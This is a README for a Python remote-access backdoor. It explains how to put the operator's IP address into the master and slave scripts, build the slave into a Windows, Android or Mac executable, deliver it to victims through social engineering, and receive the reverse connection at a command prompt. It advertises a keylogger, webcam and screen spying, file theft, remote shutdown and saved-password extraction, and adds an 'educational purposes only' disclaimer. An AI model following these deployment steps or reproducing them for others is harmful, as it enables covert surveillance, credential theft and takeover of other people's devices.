# Python backdoor V1

<p>This project is a cross-platform (Windows/Linux/android/Mac) open source, backdoor and uses reverse http request to make connections between host and slave. It's made using Python 3</p>

# Installation

### Prerequisities
<ul>
<li>Should have python version 3.9.* and above</li>
<li>Contact me on this mail to ask access for this backdoor : <a href="mailto:jayantkhanna3105@gmail.com">jayantkhanna3105@gmail.com</a></li>
<li>Visit my website to get in touch with me through multiple more ways.</li>
</ul>

### Install
```
    git clone "<Git link>"
```
Then run following commands:

```
    cd backdoor
    pip install pipwin
    pipwin install pyaudio
    pip install -r requirements.txt
```
Software is now installed 

### Usage

Get your local Ip address:

#### For windows
```
ipconfig
```
#### For LINUX
```
ifconfig
```
Copy your ip address and paste them in following files : master.py and slave.pyw <br>

In master.py line 8
```
    host = "your ip"
```

In slave.py line 6 and 33
```
    host = "your ip"
```

Enter slave folder and find slave.pyw file you need to make a exe(Windows)/apk(Android)/.app(Mac) to send to remote host via social engineering methods(Explained ahead ).<br>
To convert to exe a module is already provided if you have followed above steps follow these steps
```
    pyinstaller --onefile slave.pyw
```
If you have not installed all modules as told above run following commands:
```
    pip install pyinstaller
    pyinstaller --onefile slave.pyw
```
Make sure you are inside slave folder else you might recieve following error :
```
    102 INFO: UPX is not available.
    script 'path/to/your/download/slave.pyw' not found
```
Alternatively you can use any other method to convert to exe or apk or .app such as easyexe, py2exe, py2apk, py2app etc. <br>

Make sure master.py is running before remote host tries to connect using slave.pyw 

```
    python master.py
```
If all goes well when remote host double clicks executable file (some name.exe) you should recieve following on your terminal:
```
    python master.py

    waiting for connection
    ('your ip address', <port>) has connected
    command >>
```
# Features
<ul>
<li>Get directory where backdoor is installed</li>
<li>Send, download and remove files and folders from remote system</li>
<li>Always up untill user chooses to end backdoor on remote host</li>
<li>Get OS details</li>
<li>Open remote host's camera remotely</li>
<li>Screen share remote host's screen remotely </li>
<li>Shutdown remote host's computer remotely</li>
<li>Inbuilt keylogger </li>
<li>Get all saved passwords from user - This has been done in another repository for safety reasons : <a href = "https://github.com/jayantkhanna1/Extract-passwords">here</a>. There is also an inbuilt method to get saved passwords but it is not as strong.</li>
</ul>


# Disclaimer
<p>This program is for educational purposes only. I take no responsibility for illegal use. You are not allowed to edit this software in any form</p>

# Terms and condition for use
Please read all terms and conditions <a href="https://github.com/jayantkhanna1/backdoor/blob/master/terms&conditions.md">here</a>
